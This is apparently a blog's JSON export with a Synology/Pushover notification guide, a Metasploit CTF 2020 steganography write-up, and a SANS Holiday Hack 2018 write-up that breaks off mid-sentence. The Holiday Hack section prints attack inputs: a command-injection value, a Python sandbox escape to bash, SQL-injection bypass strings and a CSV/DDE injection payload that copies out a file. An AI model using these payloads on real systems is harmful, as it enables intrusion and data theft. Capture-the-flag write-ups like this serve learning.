[{
    "title": "Synology Pushover Notifications ",
    "date": "",
    "description": "",
    "body": "Intro I recently added a Synology NAS to my home lab and I am an instant fan. I have been spending time configuring and tinkering with the new device.\nI use Pushover for sending push notifications from various home lab services to my devices. For example, I have it integrated in Home Assistant for reminders and notifications about unique automations.\nWhen configuring notifications on the NAS, I noticed a \u0026ldquo;Push Service\u0026rdquo; tab and thought, \u0026ldquo;Great! I\u0026rsquo;ll set up Pushover.\u0026rdquo; But, to my surprise, it did not support the option and simply mentioned sending via Synology\u0026rsquo;s email server. I did some quick searches but all the solutions revolved around configuring a local web server or script on the NAS to translate and build the request. I explored the other sections and found that you can add an SMS provider and build an HTTP request. This should be sufficient to use Pushover and/or Slack.\nIt is worth mentioning that this is a work-around, but the logic is solid. Another option is to set up the Pushover notifications from e-mails, but personally I have a bunch of Applications set up and prefer each to have its own bucket and associated icon.\nConfiguration This section is split into two parts, configuration of Pushover and configuration of the Synology.\nPushover If you have never used Pushover, it is a $4.99 once per-platform cost. I do think it is well worth the price based on how many applications I have set up over the years.\n After setting up and logging into your account click Create an Application/API Token, which is next to Your Applications at the bottom of the page. Choose a unique name for the app, upload an icon (recommended), agree to the terms of service and then click Create Application. If the application is created successfully, you will be provided with an API Token/Key. As a final step for Pushover, go back to the main page find Your User Key.  You will need the API Token/Key and Your User Key to configure the Synology notifications, so either copy them both into a text editor or simply take note of where they are.\nSynology  Navigate to Control Panel -\u0026gt; Notification -\u0026gt; SMS Check the box to Enable SMS Notifications, and select Add SMS service provider Enter \u0026ldquo;pushover\u0026rdquo; as the Provider Name, https://api.pushover.net/1/messages.json as the SMS URL, select POST as the HTTP Method, and click Next. Leave the Edit HTTP request header section blank and click Next. Add the following Parameter:Values to Edit HTTP Response Body (yes all the values are blank except message) and click Next     Parameter Value     user    token    phone    message hello world    Match the following categories to the parameters, then click Apply.  Make sure the \u0026ldquo;pushover\u0026rdquo; provider you created is selected as the SMS service provider, then fill in the values from Pushover in the SMS notification section. Your User Key will be the Username:, the API Token/Key from the application page will be the Password:, and then enter a Primary phone number: (this is not used, but is required - so any phone number works).  Click Apply, and then click Send a test SMS Message. If everything is set up correctly you should receive a push notification from Pushover on your registered device:  Conclusion I find it much easier to see a quick message pop up on my phone summarizing something happening in my home lab than checking e-mail constantly. Additionally, I have a UPS attached to my Synology via USB, so it is helpful to get Pushover notifications instead of missing the e-mail alerting me to a power anomaly and that my shutdown procedures are starting.\nI hope this guide was clear and helps others!\n",
    "ref": "/blog/synology-pushover-notifications/"
  },{
    "title": "Metasploit CTF 2020 - Queen Of Diamonds Write-Up",
    "date": "",
    "description": "",
    "body": "Intro My team and I participated in the Metasploit CTF this past week and came in third place! I wanted to write up a solution for one of my favorite challenges.\nSpecial thanks to the Metasploit team for creating another great CTF and congrats to team pepega and excusemewtf for taking the top spots!\nChallenge First, I browsed to port 80 and was met with this screen:\nInteresting, I kicked off a gobuster scan but returned to find no results. The icon in the top left looked suspicious, so I loaded it directly.\nWow, a QR code\u0026hellip;\nSPOILERS BELOW - The picture linked above is the exact image from the challenge, so feel free to give it a shot before reading the solution.\nSolution I cleaned up the QR code with gimp in order to scan it.\nNow, time to scan. I used zxing:\nWell, that\u0026rsquo;s no flag. However, this output reminded us of a similar message we encountered during the initial enumeration of the box.\nDuring the initial enumeration we ran a full nmap scan:\nWe saw port 1994 open, so we ran some quick tests against it:\nSee, this also mentions a cigar. I did attempt to submit the QR code and full ms_logo to the port with nc but no luck. I started analyzing the ms_logo image with a number of Stego tools, but wasn\u0026rsquo;t getting any usable results. However, that band of color in the top left corner kept bothering me. I took a closer look with gimp:\nThen, I wrote a small Python script to print out those unique pixels:\nfrom PIL import Image im = Image.open(\u0026#39;ms_logo.png\u0026#39;) rgb_im = im.convert(\u0026#39;RGB\u0026#39;) #print(\u0026#39;width: \u0026#39;, im.width) #print(\u0026#39;height:\u0026#39;, im.height) for i in range(im.height): r,g,b = im.getpixel((13,i)) if r != b and b != g: print(r,g,b) Here are the results:\npython3 color-column.py | head -n 3 244 243 246 248 246 255 246 255 247 Now, I don\u0026rsquo;t want anyone reading this post to think I instantly recognized this. I had a suspicion that Least Significant Bit (LSB) stego was a possibility, but I stared at these numbers for awhile and even jumped to other challenges. Finally, I came back and took a look with CyberChef:\nI see a pattern here. Let me illustrate it a little better:\nThe least significant bits, four to be exact, are changing. I wrote a Python script to pull these out:\n#!/usr/bin/env python3 from PIL import Image im = Image.open(\u0026#39;ms_logo.png\u0026#39;) for i in range(13,65): pix = im.getpixel((13,i)) for n in range(0,3): print(bin(pix[n])[-4:],end=\u0026#34;\u0026#34;) Here is the output after running the tool:\n$ python3 colors.pycollected the binary and ran it through CyberChef:\nThat looks like what we have been searching for! Moving back to the port I mentioned earlier, I tried submitting the string:\nAs you can see, it confirms we cracked the code and sends flag data. I redirected this information to a file:\n$ echo -n \u0026#34;Choose Life. But why would I want to do a thing like that when I have hacking?\u0026#34; | nc 172.16.1.101 1994 \u0026gt; qr.txt I opened it in vim and deleted the top two lines. The image did open and display fine, but I ran a quick run with pngcheck to verify the file:\n$ pngcheck qr.png qr.png additional data after IEND chunk ERROR: qr.png Luckily, I have seen this before:\nxxd qr.png | tail -n 5 0000a7e0: 3734 6dda 1484 481f 3db7 d4f9 8bd9 d851 74m...H.=......Q 0000a7f0: 5c5c 8cfd fbf7 e3f8 f1e3 2829 f12c fa05 \\\\........().,.. 0000a800: 1144 10be 0741 1048 4d4d 45fb f6ed 45d9 .D...A.HMME...E. 0000a810: ce88 c1ff 0102 5199 95f0 4bd1 1e00 0000 ......Q...K..... 0000a820: 0049 454e 44ae 4260 820a .IEND.B`.. This is a quick fix. I opened the png in a hex editor and deleted the trailing 0a.\nNow it should pass the check:\n$ pngcheck queen_of_diamonds.png OK: queen_of_diamonds.png (283x378, 32-bit RGB+alpha, non-interlaced, 89.9%). After making these modifications, we can view the final flag!\n$ queen_of_diamonds.png MD5 (queen_of_diamonds.png) = 01880728bf92ae2570ce3c0cd4b01d8b Thanks for reading!\n",
    "ref": "/blog/metasploitctf2020-queen-of-diamonds-write-up/"
  },{
    "title": "About",
    "date": "",
    "description": "",
    "body": "",
    "ref": "/about/"
  },{
    "title": "Contact",
    "date": "",
    "description": "",
    "body": "",
    "ref": "/contact/"
  },{
    "title": "SANS Holiday Challenge 2018 - Writeup",
    "date": "",
    "description": "",
    "body": "Intro Hello and Happy New Year! This year\u0026rsquo;s Holiday Hack Challenge theme was an online conference called KringleCon, a cyber security conference hosted by Santa and his elves. It had all the elements of an in-person conference, including talks, badges, swag and the ability to network with other attendees. The challenge was to solve all 10 objectives and each of the \u0026ldquo;Cranberry Pi\u0026rdquo; mini-challenges.\nBefore reading my write-up, it is worth noting that previous Holiday Hack Challenges are kept all year now. So before you read this post, go try it out if you have not already.\nOne of the best parts of Holiday Hack is the collaboration and friends you make along the way. While in LineCON waiting for KringleCon to open, I hung with my buddies Cakez and Taffy:\nAfter entering Santa\u0026rsquo;s castle, I noticed a suspicious character with a walkie talkie in the middle of the first room. The name above his head read \u0026ldquo;Hans,\u0026rdquo; and I immediately recognized the Die Hard reference and knew we were in for some major fun!\nCranberry Pi Terminals Essential Editor Skills Vi can be exited a number of ways. I chose to use :q!. After exiting the editor, we were presented with the congratulatory message indicating we solved the first terminal.\nDevOps Fail As shown in the screenshot above, there are some credentials stored in this repo. I parsed through the logs with git log:\ncommit 60a2ffea7520ee980a5fc60177ff4d0633f2516b Author: Sparkle Redberry \u0026lt;sredberry@kringlecon.com\u0026gt; Date: Thu Nov 8 21:11:03 2018 -0500 Per @tcoalbox admonishment, removed username/password from config.js, default settings i n config.js.def need to be updated before use The commit mentions removal of a username/password from config.js. Using git diff, we can view the modification:\nelf@1e525d72b259:~/kcconfmgmt/.git$ git diff 60a2ffea b2376f4a diff --git a/server/config/config.js b/server/config/config.js new file mode 100644 index 0000000..25be269 --- /dev/null +++ b/server/config/config.js @@ -0,0 +1,4 @@ +// Database URL +module.exports = { + 'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api' +}; diff --git a/server/config/config.js.def b/server/config/config.js.def deleted file mode 100644 index 740eba5..0000000 --- a/server/config/config.js.def +++ /dev/null @@ -1,4 +0,0 @@ -// Database URL -module.exports = { - 'url' : 'mongodb://username:password@127.0.0.1:27017/node-api' -}; As you can see in the output above, the password that was removed from the git repo belongs to Sparkle Redberry. The password and the answer for this terminal is twinkletwinkletwinkle.\nPython Escape From LA Interestingly, we were dropped in a Python shell. Using some of Mark Baggett\u0026rsquo;s tricks helped us escape the restriction:\n\u0026gt;\u0026gt;\u0026gt; foo = eval('__imp' + 'ort__(\u0026quot;pt\u0026quot; + \u0026quot;y\u0026quot;)') \u0026gt;\u0026gt;\u0026gt; foo.spawn(\u0026quot;/bin/bash\u0026quot;) elf@fc7481ed5f69:~$ ls i_escaped elf@fc7481ed5f69:~$ ./i_escaped Loading, please wait...... ____ _ _ | _ \\ _ _| |_| |__ ___ _ __ | |_) | | | | __| '_ \\ / _ \\| '_ \\ | __/| |_| | |_| | | | (_) | | | | |_|___ \\__, |\\__|_| |_|\\___/|_| |_| _ _ | ____||___/___ __ _ _ __ ___ __| | | | _| / __|/ __/ _` | '_ \\ / _ \\/ _` | | | |___\\__ \\ (_| (_| | |_) | __/ (_| |_| |_____|___/\\___\\__,_| .__/ \\___|\\__,_(_) |_| That's some fancy Python hacking - You have sent that lizard packing! -SugarPlum Mary You escaped! Congratulations! The Name Game A quick demo of the menus revealed that option 2 \u0026ldquo;verify the system\u0026rdquo; simply runs ping. If that is running a system command, can we inject an additional command?\nValidating data store for employee onboard information. Enter address of server: 8.8.8.8; ls -al connect: Network is unreachable total 5476 drwxr-xr-x 1 elf elf 4096 Jan 14 06:29 . drwxr-xr-x 1 root root 4096 Dec 14 16:17 .. -rw-r--r-- 1 elf elf 220 Aug 31 2015 .bash_logout -rw-r--r-- 1 root root 95 Dec 14 16:13 .bashrc drwxr-xr-x 3 elf elf 4096 Jan 14 06:29 .cache drwxr-xr-x 3 elf elf 4096 Jan 14 06:29 .local -rw-r--r-- 1 root root 3866 Dec 14 16:13 menu.ps1 -rw-rw-rw- 1 root root 24576 Dec 14 16:13 onboard.db -rw-r--r-- 1 elf elf 655 May 16 2017 .profile -rwxr-xr-x 1 root root 5547968 Dec 14 16:13 runtoanswer onboard.db: SQLite 3.x database It worked and it shows the database file in the current directory. I injected another command to dump the DB:\nValidating data store for employee onboard information. Enter address of server: 8.8.8.8; sqlite3 onboard.db .dump connect: Network is unreachable PRAGMA foreign_keys=OFF; BEGIN TRANSACTION; CREATE TABLE onboard ( id INTEGER PRIMARY KEY, fname TEXT NOT NULL, lname TEXT NOT NULL, street1 TEXT, street2 TEXT, city TEXT, postalcode TEXT, phone TEXT, email TEXT ); ==========SNIPPED========= INSERT INTO \u0026quot;onboard\u0026quot; VALUES(80,'Danny','Williams','4736 47th Avenue',NULL,'Boyle','T0A 0M0','780-689-7571','dannynwilliams@rhyta.com'); INSERT INTO \u0026quot;onboard\u0026quot; VALUES(81,'Juan','Bowen','1968 Danforth Avenue',NULL,'Toronto','M4K 1A6','416-476-9751','juanabowen@teleworm.us'); INSERT INTO \u0026quot;onboard\u0026quot; VALUES(82,'Jim','Hill','3518 Main St',NULL,'Wolfville','B0P 1X0','902-697-6163','jimchill@teleworm.us'); INSERT INTO \u0026quot;onboard\u0026quot; VALUES(83,'Joseph','Johnson','3443 Delaware Avenue',NULL,'San Francisco','94108','415-274-4354','josephjjohnson@cuvox.de'); INSERT INTO \u0026quot;onboard\u0026quot; VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com'); COMMIT; onboard.db: SQLite 3.x database ==========SNIPPED========= As shown in the output above, the first name of our guy \u0026ldquo;Chan!\u0026rdquo; is Scott\u0026hellip;\nThe Sleighbell As shown in the screenshot above, the goal of this challenge is to win the sleighbell lottery. I used objdump -d sleighbell-lotto to disassemble the binary and spotted a function called winnerwinner. I loaded the binary into gdb, set a breakpoint in main, and called the discovered function:\nelf@e7e28b7283f9:~$ ls gdb objdump sleighbell-lotto elf@e7e28b7283f9:~$ gdb ./sleighbell-lotto (gdb) break main Breakpoint 1 at 0x5555555554ce (gdb) run Starting program: /home/elf/sleighbell-lotto [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026quot;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026quot;. Breakpoint 1, 0x00005555555554ce in main () (gdb) jump winnerwinner Continuing at 0x555555554fdb. ..... ...... ..,;:::::cccodkkkkkkkkkxdc;. ....... .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx......... ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.......... .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc.......... .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;. ........ 'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:. ...... ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd' .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx' .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx' xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx; :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk; ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc ...................,',,:lxkkkkkkkkkkkkkd. ..........................';;:coxkkkkk: ...............................ckd. ............................... ........................... ....................... ....... ... With gdb you fixed the race. The other elves we did out-pace. And now they'll see. They'll all watch me. I'll hang the bells on Santa's sleigh! Congratulations! You've won, and have successfully completed this challenge. CURLing Master A quick perusal of the users .bash_history file listed a cURL command. I re-ran it:\nelf@503ec8ecc91c:~$ curl --http2-prior-knowledge http://localhost:8080/index.php \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Candy Striper Turner-On'er\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;To turn the machine on, simply POST to this URL with parameter \u0026quot;status=on\u0026quot; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; The instructions presented are pretty simple. I modified my cURL command to send the appropriate data:\nelf@503ec8ecc91c:~$ curl -X POST -d status=on --http2-prior-knowledge http://localhost:8080/ index.php \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Candy Striper Turner-On'er\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;To turn the machine on, simply POST to this URL with parameter \u0026quot;status=on\u0026quot; okkd, OXXXXX, oXXXXXXo ;XXXXXXX; ;KXXXXXXx oXXXXXXXO .lKXXXXXXX0. '''''' .'''''' .'''''' .:::; ':okKXXXXXXXX0Oxcooddool, 'MMMMMO',,,,,;WMMMMM0',,,,,;WMMMMMK',,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX. 'MMMMN;,,,,,'0MMMMMW;,,,,,'OMMMMMW:,,,,,'kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d; 'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. 'MMMO',,,,,;WMMMMMO',,,,,,NMMMMMK',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: 'MMN,,,,,,'OMMMMMW;,,,,,'kMMMMMW;,,,,,'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;. 'MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO. 'M0',,,,,;WMMMMM0',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk. .c.......'cccccc.......'cccccc.......'cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc ;xKXXXXXXX0xKXXXXXXXXK. ..,:ccllc:cccccc:' Unencrypted 2.0? He's such a silly guy. That's the kind of stunt that makes my OWASP friends all cry. Truth be told: most major sites are speaking 2.0; TLS connections are in place when they do so. -Holly Evergreen \u0026lt;p\u0026gt;Congratulations! You've won and have successfully completed this challenge. \u0026lt;p\u0026gt;POSTing data in HTTP/2.0. \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Yule Log Analysis For this challenge, we are provided with Windows evtx logs, but the creators were nice enough to give us a linux box and a python script to dump the evtx logs to a text file:\nelf@2005c032725e:~$ ls evtx_dump.py ho-ho-no.evtx runtoanswer elf@2005c032725e:~$ python evtx_dump.py ho-ho-no.evtx \u0026gt; out.txt As I performed a few searches to understand the data, I could see 172.31.254.101 failing for a lot of different users. I wrote a simple one-liner that would summarize the event IDs from that IP:\nelf@0bd5ebc989bf:~$ grep -B 35 '\u0026lt;Data Name=\u0026quot;IpAddress\u0026quot;\u0026gt;172.31.254.101\u0026lt;/Data\u0026gt;' out.txt | grep '\u0026lt;EventID Qualifiers=\u0026quot;\u0026quot;\u0026gt; 4624\u0026lt;/EventID\u0026gt;' | wc -l 2 elf@0bd5ebc989bf:~$ grep -B 35 '\u0026lt;Data Name=\u0026quot;IpAddress\u0026quot;\u0026gt;172.31.254.101\u0026lt;/Data\u0026gt;' out.txt | grep '\u0026lt;EventID Qualifiers=\u0026quot;\u0026quot;\u0026gt;4625\u0026lt;/EventID\u0026gt;' | wc -l 211 For the unfamiliar, the event ID 4625 is a failed login and 4624 is a successful login. The data showed that the attacker failed 211 logins and successfully logged in twice. I checked what that the username data looked like:\nelf@be089c31f517:~$ grep -B 35 '\u0026lt;Data Name=\u0026quot;IpAddress\u0026quot;\u0026gt;172.31.254.101\u0026lt;/Data\u0026gt;' out.txt | egrep '\u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;' | sort | uniq -c | sort 1 \u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;aaron.smith\u0026lt;/Data\u0026gt; ————————————————— SNIPPED ————————————————————— 1 \u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;vijay.kumar\u0026lt;/Data\u0026gt; 1 \u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;vinod.kumar\u0026lt;/Data\u0026gt; 1 \u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;wunorse.openslae\u0026lt;/Data\u0026gt; 2 \u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;minty.candycane\u0026lt;/Data\u0026gt; I knew that only a single account was compromised and password spraying was the vector. The output shows that minty.candycane is the account that was broken into due to it being an outlier with two successful logins, while every other account had one failed login.\nLethal ForensicELFication The first item of note for this challenge is a hidden directory named .secrets. It contained a directory called \u0026ldquo;her\u0026rdquo; that contained a poem.txt. However, the poem did not reveal who it was about. There is a .viminfo file in the home directory. This file is used to store state information so you can continue where you left off when you exited vim.\n$ cat .viminfo # This viminfo file was generated by Vim 8.0. # You may edit it if you're careful! # Command Line History (newest to oldest): :wq |2,0,1536607231,,\u0026quot;wq\u0026quot; :%s/Elinore/NEVERMORE/g |2,0,1536607217,,\u0026quot;%s/Elinore/NEVERMORE/g\u0026quot; The .viminfo file contained the command line history. This history reveals that Morcel Nougat performed a global search and replace in vim to replace all instances of Elinore with NEVERMORE. Submitting Elinore to runtoanswer results in:\nStall Mucking Report The screen resolution for this made it a bit difficult. I sent the results of ps a to a file and viewed the contents:\nelf@0cecab02e316:~$ ps a \u0026gt; out.txt elf@0cecab02e316:~$ cat out.txt PID TTY STAT TIME COMMAND 1 pts/0 Ss 0:00 /bin/bash /sbin/init 10 pts/0 S 0:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload 11 pts/0 S 0:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py 15 pts/0 S 0:00 sudo -u elf /bin/bash 16 pts/0 S 0:00 /usr/bin/python /home/manager/report-check.py 17 pts/0 S 0:00 /bin/bash 20 pts/0 S 0:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload 22 pts/0 S 0:00 sleep 60 31 pts/0 R+ 0:00 ps a The output shows the password in cleartext: directreindeerflatterystable. I used smbclient to upload the report:\nelf@0cecab02e316:~$ smbclient //localhost/report-upload -c 'put report.txt report.txt' -U report-upload WARNING: The \u0026quot;syslog\u0026quot; option is deprecated Enter report-upload's password: Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian] putting file report.txt as \\report.txt (500.9 kb/s) (average 501.0 kb/s) elf@0cecab02e316:~$ .;;;;;;;;;;;;;;;' ,NWOkkkkkkkkkkkkkkNN; ..KM; Stall Mucking ,MN.. OMNXNMd. .oMWXXM0. ;MO l0NNNNNNNNNNNNNNN0o xMc :MO xMl '. :MO dOOOOOOOOOOOOOOOOOd. xMl :l:. .cc::::::::;;;;;;;;;;;,oMO .0NNNNNNNNNNNNNNNNN0. xMd,,,,,,,,,,,,,clll:. 'kkkkxxxxxddddddoooooooxMO ..'''''''''''. xMkcccccccllllllllllooc. 'kkkkxxxxxddddddoooooooxMO .MMMMMMMMMMMMMM, xMkcccccccllllllllllooool 'kkkkxxxxxddddddoooooooxMO '::::::::::::, xMkcccccccllllllllllool, .ooooollllllccccccccc::dMO xMx;;;;;::::::::lllll' :MO .ONNNNNNNNXk xMl :lc' :MO dOOOOOOOOOo xMl ;. :MO 'cccccccccccccc:' xMl :MO .WMMMMMMMMMMMMMMMW. xMl :MO ............... xMl .NWxddddddddddddddddddddddddNW' ;ccccccccccccccccccccccccc; You have found the credentials I just had forgot, And in doing so you've saved me trouble untold. Going forward we'll leave behind policies old, Building separate accounts for each elf in the lot. -Wunorse Openslae Objectives Objective 1: Orientation Challenge What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle?\nThe image above shows me standing next to the kiosk. It poses six questions about past Holiday Hack challenges. The answers were:\n  In 2015, the Dosis siblings asked for help understanding what piece of their \u0026ldquo;Gnome in Your Home\u0026rdquo; toy?\nFirmware\n  In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?\nATNAS\n  In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?\nBusiness card\n  In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?\nCranberry Pi\n  In 2017, the North Pole was being bombarded by giant objects. What were they?\nSnowballs\n  In 2017, Sam the snowman needed help reassembling pages torn from what?\nThe Great Book\n  After answering all these, the secret phrase was revealed:\nObjective 2: Directory Browsing Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site (https://cfp.kringlecastle.com/) to find out.\nI browsed to the CFP site to take a look:\nWhen I clicked APPLY NOW! link, it brought me to this URL:\nI noted the cfp directory and removed cfp.html from the URL:\nNice, a directory listing! The listing contained a document called rejected-talks.csv. I clicked the link and searched the document for the title of the rejected talk:\nThe rejected talk was submitted by John McClane.\nObjective 3: de Bruijn Sequences When you break into the speaker unpreparedness room, what does Morcel Nougat say?\nThe door passcode panel indicated that the code was a four-shape combination. I will be totally honest here - I was preparing to write a script when I noticed that you can submit unlimited sequences without getting kicked from the terminal window. I simply \u0026ldquo;button-mashed\u0026rdquo; a few times and got lucky.\nAfter gaining access to the room and clicking on him, Morcel Nougat proclaims “Welcome unprepared speaker!”\nObjective 4: Data Repo Analysis Retrieve the encrypted ZIP file from the North Pole Git repository. What is the password to open this file?\nI cloned the repo and ran git log to look for anything interesting. I found a commit with an intriguing message:\ncommit 714ba109e573f37a6538beeeb7d11c9391e92a72 Author: Shinny Upatree \u0026lt;shinny.upatree@kringlecastle.com\u0026gt; Date: Tue Dec 11 07:23:36 2018 +0000 removing accidental commit Then, running a quick git diff between the accidental commit and the previous commit revealed this:\n$ git diff 714ba109 5f4f6414 diff --git a/schematics/files/dot/PW/for_elf_eyes_only.md b/schematics/files/dot/PW/for_elf_eyes_only.md new file mode 100644 index 0000000..b06a507 --- /dev/null +++ b/schematics/files/dot/PW/for_elf_eyes_only.md @@ -0,0 +1,15 @@ +Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference. + +Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did! + + +Hopefully this is the last time we have to change our password again until next Christmas. + + + + +Password = 'Yippee-ki-yay' + + +Change ID = '9ed54617547cfca783e0f81f8dc5c927e3d1e3' + I navigated to the schematics directory and unzipped ventilation_diagram.zip with the password Yippee-ki-yay. Submitting this password completed the objective and the ventilation diagrams provided the map to complete the Google Ventilation Maze.\nObjective 5: AD Privilege Discovery Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name?\nI was very excited for this challenge, I\u0026rsquo;m a big fan of BloodHound. I was hoping for a difficult challenge like writing a custom Cypher query, but getting others familiar with BloodHound is also important!\nAfter loading the BloodHound interface and navigating to the Queries section, there is a pre-built query that does exactly what we are looking for. A small tip here - since CanRDP is not a reliable path, I disabled it in the Edge Filtering menu (located under Special):\nRunning this pre-built query with the CanRDP filter unchecked resulted in only one path:\nTherefore, the only Kerberoastable user with a reliable path to DA is LDUBEJ00320@AD.KRINGLECASTLE.COM.\nObjective 6: Badge Manipulation Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available. What is the access control number revealed by the door authentication panel?\nI performed some quick analysis of the sample badge:\n When scanned by the badge reader, it indicated the account is disabled The QR code on the badge contained oRfjg5uGHmbduj2m  Next, I created a new QR code with a single quote. Submitting that to the badge reader resulted in this error:\nEXCEPTION AT (LINE 96 \u0026quot;USER_INFO = QUERY(\u0026quot;SELECT FIRST_NAME,LAST_NAME,ENABLED FROM EMPLOYEES WHERE AUTHORIZED = 1 AND UID = '{}' LIMIT 1\u0026quot;.FORMAT(UID))\u0026quot;): (1064, U'YOU HAVE AN ERROR IN YOUR SQL SYNTAX; CHECK THE MANUAL THAT CORRESPONDS TO YOUR MARIADB SERVER VERSION FOR THE RIGHT SYNTAX TO USE NEAR '' LIMIT 1' AT LINE 1\u0026quot;) Great! A very verbose SQL error. I tried the generic auth bypass string:\n' OR \u0026lsquo;1\u0026rsquo; = \u0026lsquo;1\nHowever, this failed because it is returning a user account that is disabled. I modified my query string to ensure I get an enabled user:\n\u0026rsquo; OR enabled=\u0026lsquo;1\nSubmitting this granted us access to Santa\u0026rsquo;s secret room and output the control number 19880715.\nObjective 7: HR Incident Response Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with \u0026ldquo;K.\u0026quot;\nThe target website is a pretty standard careers page, with an option to upload a CSV containing your work history. The hints for this challenge indicate that the vector may be related to CSV Injection.\nI created a CSV file (in vim) with this content and uploaded it:\n=cmd|'/C copy C:\\candidate_evaluation.docx C:\\careerportal\\resources\\public\\foobar1.docx'!A1 This injected command copies the candidate evaluation document to a location I can access externally. After waiting a few seconds, I browsed to:\nhttps://careers.kringlecastle.com/public/foobar.docx\nI downloaded the document and opened it. It contained this snippet:\n\u0026quot;Krampus’s career summary included experience hardening decade old attack vectors, and lacked updated skills to meet the challenges of attacks against our beloved Holidays. Furthermore, there is intelligence from the North Pole this elf is linked to cyber terrorist organization Fancy Beaver who openly provides technical support to the villains that attacked our Holidays last year.\u0026quot;  The answer to this objective is Fancy Beaver.\nObjective 8: Network Traffic Forensics Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball?\nThis one really stumped me for awhile! When I first took a look at the Packalyzer app, I ran a capture, downloaded it, and investigated using Wireshark. Unfortunately, the traffic is encrypted, but that jogged my memory about something I had seen. After solving the Python Cranberry Pi, SugarPlum Mary shares a rumor that Packalyzer was rushed into production with development code sitting in the web root. I investigated and found a reference to app.js in a comment in the pages source. I loaded app.js:\nThe screenshot above shows:\n We need that keylog file to decrypt the HTTP/2 traffic The app is in dev mode Environment variables are being used  I knew that I needed to leak the environment variables, but how? Further down in the code:\nThis showed that the application builds the directory structure using the environment variables. Now, this is where I really tripped myself up\u0026hellip; I loaded /DEV/ saw this output:\nI thought to myself, \u0026ldquo;Well, that didn\u0026rsquo;t work\u0026hellip;\u0026rdquo; and went on testing and researching anything that could leak the environment variables. If I had run the second test, shown below, I would have realized that /DEV/ worked and I was just moving too quickly:\nAs shown in the two screenshots, I was able to obtain the environment variables values from the error messages. Then I loaded the final URL to grab the client random SSL log:\nI saved that to a file and loaded it into Wireshark (Preferences \u0026gt; Protocols \u0026gt; SSL):\nParsing the decrypted pcap, I expected to see a document sent but I was only able to collect three sets of credentials:\nalabaster:Packer-p@re-turntable192 bushy:Floppity_Floopy-flab19283 pepper:Shiz-Bamer_wabl182 Looking closer, these are the three users credentials for packalyzer. I logged in with all three to search around and Alabaster had a capture saved named \u0026ldquo;super_secret_packet_capture.pcap\u0026rdquo;. It is a capture containing only one stream, a single SMTP connection:\nThe email contained an 